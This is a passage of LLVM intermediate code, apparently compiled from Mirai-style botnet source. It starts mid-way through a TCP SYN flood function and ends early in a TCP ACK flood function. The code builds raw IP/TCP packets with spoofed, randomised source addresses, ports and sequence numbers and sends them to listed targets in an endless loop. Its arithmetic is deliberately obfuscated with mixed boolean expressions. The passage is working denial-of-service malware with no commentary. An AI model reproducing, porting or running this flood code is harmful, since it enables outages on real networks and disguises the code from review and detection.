  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %629

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %446, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %451

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 15, -1
  %135 = xor i8 %133, %134
  %136 = and i8 %135, %133
  %137 = and i8 %133, 15
  %138 = xor i8 %136, -1
  %139 = xor i8 64, -1
  %140 = xor i8 -102, -1
  %141 = and i8 %138, -102
  %142 = and i8 %136, %140
  %143 = and i8 %139, -102
  %144 = and i8 64, %140
  %145 = or i8 %141, %142
  %146 = or i8 %143, %144
  %147 = xor i8 %145, %146
  %148 = or i8 %138, %139
  %149 = xor i8 %148, -1
  %150 = or i8 -102, %140
  %151 = and i8 %149, %150
  %152 = or i8 %147, %151
  %153 = or i8 %136, 64
  store i8 %152, i8* %132, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = xor i8 %156, -1
  %158 = xor i8 -16, -1
  %159 = xor i8 -38, -1
  %160 = or i8 %157, %158
  %161 = or i8 -38, %159
  %162 = xor i8 %160, -1
  %163 = and i8 %162, %161
  %164 = and i8 %156, -16
  %165 = xor i8 %163, -1
  %166 = xor i8 5, -1
  %167 = xor i8 -96, -1
  %168 = and i8 %165, -96
  %169 = and i8 %163, %167
  %170 = and i8 %166, -96
  %171 = and i8 5, %167
  %172 = or i8 %168, %169
  %173 = or i8 %170, %171
  %174 = xor i8 %172, %173
  %175 = or i8 %165, %166
  %176 = xor i8 %175, -1
  %177 = or i8 -96, %167
  %178 = and i8 %176, %177
  %179 = or i8 %174, %178
  %180 = or i8 %163, 5
  store i8 %179, i8* %155, align 4
  %181 = load i8, i8* %12, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = call zeroext i16 @htons(i16 zeroext 60) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %13, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %113
  %197 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

; <label>:200:                                    ; preds = %196, %113
  %201 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 6, i8* %202, align 1
  %203 = load i32, i32* %26, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %207 = load i32, i32* %9, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 1
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  %214 = load i16, i16* %16, align 2
  %215 = call zeroext i16 @htons(i16 zeroext %214) #7
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 0
  store i16 %215, i16* %217, align 4
  %218 = load i16, i16* %17, align 2
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 1
  store i16 %219, i16* %221, align 2
  %222 = load i32, i32* %18, align 4
  %223 = trunc i32 %222 to i16
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = zext i16 %224 to i32
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 2
  store i32 %225, i32* %227, align 4
  %228 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = xor i16 %230, -1
  %232 = xor i16 -241, -1
  %233 = xor i16 -21099, -1
  %234 = or i16 %231, %232
  %235 = or i16 -21099, %233
  %236 = xor i16 %234, -1
  %237 = and i16 %236, %235
  %238 = and i16 %230, -241
  %239 = and i16 %237, 160
  %240 = xor i16 %237, 160
  %241 = or i16 %239, %240
  %242 = or i16 %237, 160
  store i16 %241, i16* %229, align 4
  %243 = load i8, i8* %20, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = xor i16 1, -1
  %249 = xor i16 %244, %248
  %250 = and i16 %249, %244
  %251 = and i16 %244, 1
  %252 = shl i16 %250, 13
  %253 = xor i16 -8193, -1
  %254 = xor i16 %247, %253
  %255 = and i16 %254, %247
  %256 = and i16 %247, -8193
  %257 = and i16 %255, %252
  %258 = xor i16 %255, %252
  %259 = or i16 %257, %258
  %260 = or i16 %255, %252
  store i16 %259, i16* %246, align 4
  %261 = load i8, i8* %21, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 %262, -1
  %267 = xor i16 1, -1
  %268 = xor i16 -5835, -1
  %269 = or i16 %266, %267
  %270 = or i16 -5835, %268
  %271 = xor i16 %269, -1
  %272 = and i16 %271, %270
  %273 = and i16 %262, 1
  %274 = shl i16 %272, 12
  %275 = xor i16 -4097, -1
  %276 = xor i16 %265, %275
  %277 = and i16 %276, %265
  %278 = and i16 %265, -4097
  %279 = and i16 %277, %274
  %280 = xor i16 %277, %274
  %281 = or i16 %279, %280
  %282 = or i16 %277, %274
  store i16 %281, i16* %264, align 4
  %283 = load i8, i8* %22, align 1
  %284 = sext i8 %283 to i16
  %285 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = xor i16 1, -1
  %289 = xor i16 %284, %288
  %290 = and i16 %289, %284
  %291 = and i16 %284, 1
  %292 = shl i16 %290, 11
  %293 = xor i16 %287, -1
  %294 = xor i16 -2049, -1
  %295 = xor i16 -20156, -1
  %296 = or i16 %293, %294
  %297 = or i16 -20156, %295
  %298 = xor i16 %296, -1
  %299 = and i16 %298, %297
  %300 = and i16 %287, -2049
  %301 = and i16 %299, %292
  %302 = xor i16 %299, %292
  %303 = or i16 %301, %302
  %304 = or i16 %299, %292
  store i16 %303, i16* %286, align 4
  %305 = load i8, i8* %23, align 1
  %306 = sext i8 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 4
  %309 = load i16, i16* %308, align 4
  %310 = xor i16 %306, -1
  %311 = xor i16 1, -1
  %312 = xor i16 8649, -1
  %313 = or i16 %310, %311
  %314 = or i16 8649, %312
  %315 = xor i16 %313, -1
  %316 = and i16 %315, %314
  %317 = and i16 %306, 1
  %318 = shl i16 %316, 10
  %319 = xor i16 -1025, -1
  %320 = xor i16 %309, %319
  %321 = and i16 %320, %309
  %322 = and i16 %309, -1025
  %323 = and i16 %321, %318
  %324 = xor i16 %321, %318
  %325 = or i16 %323, %324
  %326 = or i16 %321, %318
  store i16 %325, i16* %308, align 4
  %327 = load i8, i8* %24, align 1
  %328 = sext i8 %327 to i16
  %329 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 4
  %331 = load i16, i16* %330, align 4
  %332 = xor i16 %328, -1
  %333 = xor i16 1, -1
  %334 = xor i16 -4275, -1
  %335 = or i16 %332, %333
  %336 = or i16 -4275, %334
  %337 = xor i16 %335, -1
  %338 = and i16 %337, %336
  %339 = and i16 %328, 1
  %340 = shl i16 %338, 9
  %341 = xor i16 -513, -1
  %342 = xor i16 %331, %341
  %343 = and i16 %342, %331
  %344 = and i16 %331, -513
  %345 = xor i16 %343, -1
  %346 = xor i16 %340, -1
  %347 = xor i16 29017, -1
  %348 = and i16 %345, 29017
  %349 = and i16 %343, %347
  %350 = and i16 %346, 29017
  %351 = and i16 %340, %347
  %352 = or i16 %348, %349
  %353 = or i16 %350, %351
  %354 = xor i16 %352, %353
  %355 = or i16 %345, %346
  %356 = xor i16 %355, -1
  %357 = or i16 29017, %347
  %358 = and i16 %356, %357
  %359 = or i16 %354, %358
  %360 = or i16 %343, %340
  store i16 %359, i16* %330, align 4
  %361 = load i8, i8* %25, align 1
  %362 = sext i8 %361 to i16
  %363 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %364 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 4
  %366 = xor i16 %362, -1
  %367 = xor i16 1, -1
  %368 = xor i16 -22605, -1
  %369 = or i16 %366, %367
  %370 = or i16 -22605, %368
  %371 = xor i16 %369, -1
  %372 = and i16 %371, %370
  %373 = and i16 %362, 1
  %374 = shl i16 %372, 8
  %375 = xor i16 %365, -1
  %376 = xor i16 -257, -1
  %377 = xor i16 29355, -1
  %378 = or i16 %375, %376
  %379 = or i16 29355, %377
  %380 = xor i16 %378, -1
  %381 = and i16 %380, %379
  %382 = and i16 %365, -257
  %383 = xor i16 %381, -1
  %384 = xor i16 %374, -1
  %385 = xor i16 10724, -1
  %386 = and i16 %383, 10724
  %387 = and i16 %381, %385
  %388 = and i16 %384, 10724
  %389 = and i16 %374, %385
  %390 = or i16 %386, %387
  %391 = or i16 %388, %389
  %392 = xor i16 %390, %391
  %393 = or i16 %383, %384
  %394 = xor i16 %393, -1
  %395 = or i16 10724, %385
  %396 = and i16 %394, %395
  %397 = or i16 %392, %396
  %398 = or i16 %381, %374
  store i16 %397, i16* %364, align 4
  %399 = load i8*, i8** %29, align 8
  %400 = getelementptr inbounds i8, i8* %399, i32 1
  store i8* %400, i8** %29, align 8
  store i8 2, i8* %399, align 1
  %401 = load i8*, i8** %29, align 8
  %402 = getelementptr inbounds i8, i8* %401, i32 1
  store i8* %402, i8** %29, align 8
  store i8 4, i8* %401, align 1
  %403 = call i32 @rand_next()
  %404 = xor i32 %403, -1
  %405 = xor i32 15, -1
  %406 = xor i32 491454179, -1
  %407 = or i32 %404, %405
  %408 = or i32 491454179, %406
  %409 = xor i32 %407, -1
  %410 = and i32 %409, %408
  %411 = and i32 %403, 15
  %412 = sub i32 0, %410
  %413 = sub i32 1400, %412
  %414 = add i32 1400, %410
  %415 = trunc i32 %413 to i16
  %416 = call zeroext i16 @htons(i16 zeroext %415) #7
  %417 = load i8*, i8** %29, align 8
  %418 = bitcast i8* %417 to i16*
  store i16 %416, i16* %418, align 2
  %419 = load i8*, i8** %29, align 8
  %420 = getelementptr inbounds i8, i8* %419, i64 2
  store i8* %420, i8** %29, align 8
  %421 = load i8*, i8** %29, align 8
  %422 = getelementptr inbounds i8, i8* %421, i32 1
  store i8* %422, i8** %29, align 8
  store i8 4, i8* %421, align 1
  %423 = load i8*, i8** %29, align 8
  %424 = getelementptr inbounds i8, i8* %423, i32 1
  store i8* %424, i8** %29, align 8
  store i8 2, i8* %423, align 1
  %425 = load i8*, i8** %29, align 8
  %426 = getelementptr inbounds i8, i8* %425, i32 1
  store i8* %426, i8** %29, align 8
  store i8 8, i8* %425, align 1
  %427 = load i8*, i8** %29, align 8
  %428 = getelementptr inbounds i8, i8* %427, i32 1
  store i8* %428, i8** %29, align 8
  store i8 10, i8* %427, align 1
  %429 = call i32 @rand_next()
  %430 = load i8*, i8** %29, align 8
  %431 = bitcast i8* %430 to i32*
  store i32 %429, i32* %431, align 4
  %432 = load i8*, i8** %29, align 8
  %433 = getelementptr inbounds i8, i8* %432, i64 4
  store i8* %433, i8** %29, align 8
  %434 = load i8*, i8** %29, align 8
  %435 = bitcast i8* %434 to i32*
  store i32 0, i32* %435, align 4
  %436 = load i8*, i8** %29, align 8
  %437 = getelementptr inbounds i8, i8* %436, i64 4
  store i8* %437, i8** %29, align 8
  %438 = load i8*, i8** %29, align 8
  %439 = getelementptr inbounds i8, i8* %438, i32 1
  store i8* %439, i8** %29, align 8
  store i8 1, i8* %438, align 1
  %440 = load i8*, i8** %29, align 8
  %441 = getelementptr inbounds i8, i8* %440, i32 1
  store i8* %441, i8** %29, align 8
  store i8 3, i8* %440, align 1
  %442 = load i8*, i8** %29, align 8
  %443 = getelementptr inbounds i8, i8* %442, i32 1
  store i8* %443, i8** %29, align 8
  store i8 3, i8* %442, align 1
  %444 = load i8*, i8** %29, align 8
  %445 = getelementptr inbounds i8, i8* %444, i32 1
  store i8* %445, i8** %29, align 8
  store i8 6, i8* %444, align 1
  br label %446

; <label>:446:                                    ; preds = %200
  %447 = load i32, i32* %9, align 4
  %448 = sub i32 0, 1
  %449 = sub i32 %447, %448
  %450 = add nsw i32 %447, 1
  store i32 %449, i32* %9, align 4
  br label %108

; <label>:451:                                    ; preds = %108
  br label %452

; <label>:452:                                    ; preds = %628, %451
  store i32 0, i32* %9, align 4
  br label %453

; <label>:453:                                    ; preds = %623, %452
  %454 = load i32, i32* %9, align 4
  %455 = load i8, i8* %5, align 1
  %456 = zext i8 %455 to i32
  %457 = icmp slt i32 %454, %456
  br i1 %457, label %458, label %628

; <label>:458:                                    ; preds = %453
  %459 = load i8**, i8*** %11, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds i8*, i8** %459, i64 %461
  %463 = load i8*, i8** %462, align 8
  store i8* %463, i8** %30, align 8
  %464 = load i8*, i8** %30, align 8
  %465 = bitcast i8* %464 to %struct.iphdr*
  store %struct.iphdr* %465, %struct.iphdr** %31, align 8
  %466 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i64 1
  %468 = bitcast %struct.iphdr* %467 to %struct.tcphdr*
  store %struct.tcphdr* %468, %struct.tcphdr** %32, align 8
  %469 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %470 = load i32, i32* %9, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i64 %471
  %473 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %472, i32 0, i32 2
  %474 = load i8, i8* %473, align 4
  %475 = zext i8 %474 to i32
  %476 = icmp slt i32 %475, 32
  br i1 %476, label %477, label %501

; <label>:477:                                    ; preds = %458
  %478 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %479 = load i32, i32* %9, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i64 %480
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i32 0, i32 1
  %483 = load i32, i32* %482, align 4
  %484 = call i32 @ntohl(i32 %483) #7
  %485 = call i32 @rand_next()
  %486 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %487 = load i32, i32* %9, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %486, i64 %488
  %490 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %489, i32 0, i32 2
  %491 = load i8, i8* %490, align 4
  %492 = zext i8 %491 to i32
  %493 = lshr i32 %485, %492
  %494 = sub i32 %484, 417757852
  %495 = add i32 %494, %493
  %496 = add i32 %495, 417757852
  %497 = add i32 %484, %493
  %498 = call i32 @htonl(i32 %496) #7
  %499 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 9
  store i32 %498, i32* %500, align 4
  br label %501

; <label>:501:                                    ; preds = %477, %458
  %502 = load i32, i32* %26, align 4
  %503 = icmp eq i32 %502, -1
  br i1 %503, label %504, label %508

; <label>:504:                                    ; preds = %501
  %505 = call i32 @rand_next()
  %506 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 8
  store i32 %505, i32* %507, align 4
  br label %508

; <label>:508:                                    ; preds = %504, %501
  %509 = load i16, i16* %13, align 2
  %510 = zext i16 %509 to i32
  %511 = icmp eq i32 %510, 65535
  br i1 %511, label %512, label %521

; <label>:512:                                    ; preds = %508
  %513 = call i32 @rand_next()
  %514 = xor i32 65535, -1
  %515 = xor i32 %513, %514
  %516 = and i32 %515, %513
  %517 = and i32 %513, 65535
  %518 = trunc i32 %516 to i16
  %519 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 3
  store i16 %518, i16* %520, align 4
  br label %521

; <label>:521:                                    ; preds = %512, %508
  %522 = load i16, i16* %16, align 2
  %523 = zext i16 %522 to i32
  %524 = icmp eq i32 %523, 65535
  br i1 %524, label %525, label %538

; <label>:525:                                    ; preds = %521
  %526 = call i32 @rand_next()
  %527 = xor i32 %526, -1
  %528 = xor i32 65535, -1
  %529 = xor i32 -1961610437, -1
  %530 = or i32 %527, %528
  %531 = or i32 -1961610437, %529
  %532 = xor i32 %530, -1
  %533 = and i32 %532, %531
  %534 = and i32 %526, 65535
  %535 = trunc i32 %533 to i16
  %536 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %537 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %536, i32 0, i32 0
  store i16 %535, i16* %537, align 4
  br label %538

; <label>:538:                                    ; preds = %525, %521
  %539 = load i16, i16* %17, align 2
  %540 = zext i16 %539 to i32
  %541 = icmp eq i32 %540, 65535
  br i1 %541, label %542, label %555

; <label>:542:                                    ; preds = %538
  %543 = call i32 @rand_next()
  %544 = xor i32 %543, -1
  %545 = xor i32 65535, -1
  %546 = xor i32 1228722136, -1
  %547 = or i32 %544, %545
  %548 = or i32 1228722136, %546
  %549 = xor i32 %547, -1
  %550 = and i32 %549, %548
  %551 = and i32 %543, 65535
  %552 = trunc i32 %550 to i16
  %553 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 1
  store i16 %552, i16* %554, align 2
  br label %555

; <label>:555:                                    ; preds = %542, %538
  %556 = load i32, i32* %18, align 4
  %557 = icmp eq i32 %556, 65535
  br i1 %557, label %558, label %562

; <label>:558:                                    ; preds = %555
  %559 = call i32 @rand_next()
  %560 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 2
  store i32 %559, i32* %561, align 4
  br label %562

; <label>:562:                                    ; preds = %558, %555
  %563 = load i32, i32* %19, align 4
  %564 = icmp eq i32 %563, 65535
  br i1 %564, label %565, label %569

; <label>:565:                                    ; preds = %562
  %566 = call i32 @rand_next()
  %567 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %568 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %567, i32 0, i32 3
  store i32 %566, i32* %568, align 4
  br label %569

; <label>:569:                                    ; preds = %565, %562
  %570 = load i8, i8* %20, align 1
  %571 = icmp ne i8 %570, 0
  br i1 %571, label %572, label %585

; <label>:572:                                    ; preds = %569
  %573 = call i32 @rand_next()
  %574 = xor i32 %573, -1
  %575 = xor i32 65535, -1
  %576 = xor i32 309019141, -1
  %577 = or i32 %574, %575
  %578 = or i32 309019141, %576
  %579 = xor i32 %577, -1
  %580 = and i32 %579, %578
  %581 = and i32 %573, 65535
  %582 = trunc i32 %580 to i16
  %583 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 7
  store i16 %582, i16* %584, align 2
  br label %585

; <label>:585:                                    ; preds = %572, %569
  %586 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %587 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %586, i32 0, i32 7
  store i16 0, i16* %587, align 2
  %588 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %589 = bitcast %struct.iphdr* %588 to i16*
  %590 = call zeroext i16 @checksum_generic(i16* %589, i32 20)
  %591 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %592 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %591, i32 0, i32 7
  store i16 %590, i16* %592, align 2
  %593 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 6
  store i16 0, i16* %594, align 4
  %595 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %596 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %597 = bitcast %struct.tcphdr* %596 to i8*
  %598 = call zeroext i16 @htons(i16 zeroext 40) #7
  %599 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %595, i8* %597, i16 zeroext %598, i32 40)
  %600 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %601 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %600, i32 0, i32 6
  store i16 %599, i16* %601, align 4
  %602 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 1
  %604 = load i16, i16* %603, align 2
  %605 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %606 = load i32, i32* %9, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %605, i64 %607
  %609 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i32 0, i32 0
  %610 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %609, i32 0, i32 1
  store i16 %604, i16* %610, align 2
  %611 = load i32, i32* %10, align 4
  %612 = load i8*, i8** %30, align 8
  %613 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %614 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %615 = load i32, i32* %9, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %614, i64 %616
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %617, i32 0, i32 0
  %619 = bitcast %struct.sockaddr_in* %618 to %struct.sockaddr*
  store %struct.sockaddr* %619, %struct.sockaddr** %613, align 8
  %620 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %621 = load %struct.sockaddr*, %struct.sockaddr** %620, align 8
  %622 = call i64 @sendto(i32 %611, i8* %612, i64 60, i32 16384, %struct.sockaddr* %621, i32 16)
  br label %623

; <label>:623:                                    ; preds = %585
  %624 = load i32, i32* %9, align 4
  %625 = sub i32 0, 1
  %626 = sub i32 %624, %625
  %627 = add nsw i32 %624, 1
  store i32 %626, i32* %9, align 4
  br label %453

; <label>:628:                                    ; preds = %453
  br label %452

; <label>:629:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
